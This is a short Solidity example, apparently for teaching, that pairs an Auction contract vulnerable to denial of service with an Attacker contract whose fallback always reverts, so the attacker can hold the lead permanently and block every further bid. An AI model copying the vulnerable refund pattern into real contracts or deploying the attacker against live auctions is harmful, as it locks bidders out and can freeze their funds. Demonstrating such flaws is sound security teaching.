pragma solidity ^0.6.4;
contract Auction {
    address payable currentLeader; //CurrentLeader 를 Attacker로 세팅
    uint highestBid;

    constructor() public {
        currentLeader = msg.sender;
    }

    function bid() public payable {
        require(msg.value > highestBid);
        require(currentLeader.send(highestBid));
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

pragma solidity ^0.6.4;
contract Attacker {
    fallback () external {
        revert();
    }
}